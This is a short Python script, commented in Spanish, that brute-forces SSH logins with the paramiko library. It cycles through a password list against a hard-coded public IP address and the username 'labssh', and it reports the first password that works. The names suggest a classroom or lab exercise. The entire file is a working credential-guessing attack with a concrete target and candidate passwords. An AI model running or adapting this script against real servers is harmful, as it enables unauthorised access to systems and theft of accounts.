import paramiko # Importamos la librería paramiko

def fuerza_bruta_ssh(host, usuario, lista_contraseñas): # Definimos la función fuerza_bruta_ssh con los parametros host, usuario y lista_contraseñas
    cliente = paramiko.SSHClient() # Creamos un objeto SSHClient
    cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # Establecemos la política para agregar automáticamente la clave de host

    for contraseña in lista_contraseñas: # Iteramos sobre la lista de contraseñas
        try: 
            print(f"Intentando contraseña: {contraseña}") # Imprimimos el intento de contraseña
            cliente.connect(host, username=usuario, password=contraseña) # Intentamos conectar con la contraseña actual
            print(f"Contraseña encontrada: {contraseña}") # Si se conecta, imprimimos la contraseña encontrada
            return contraseña # Retornamos la contraseña encontrada
        except paramiko.AuthenticationException: # Si se produce un AuthenticationException, significa que la contraseña es incorrecta
            print(f"Contraseña {contraseña} falló.") # Imprimimos que la contraseña falló
        except Exception as e: # Si se produce cualquier otro tipo de excepción
            print(f"Error: {e}") # Imprimimos el error
            break # Salimos del bucle
    cliente.close() # Cerramos el cliente SSH
    return None  # Si no se encuentra ninguna contraseña, retornamos None

if __name__ == "__main__": 
    host = "74.179.81.132"  # Cambia esto por la dirección IP del servidor
    usuario = "labssh"  # Cambia esto por el nombre de usuario
    lista_contraseñas = ["Programacion2", "Messi1010", "progralab123"]  # Lista de contraseñas a probar

    contraseña_encontrada = fuerza_bruta_ssh(host, usuario, lista_contraseñas) # Llamamos a la función fuerza_bruta_ssh con los parámetros host, usuario
    if contraseña_encontrada: # Si se encontró una contraseña
        print(f"Ingreso exitoso con la contraseña: {contraseña_encontrada}") # Imprimimos el mensaje de ingreso exitoso
    else: # Si no se encontró ninguna contraseña
        print("No se encontró una contraseña válida.") # Imprimimos el mensaje de no encontrar contraseña
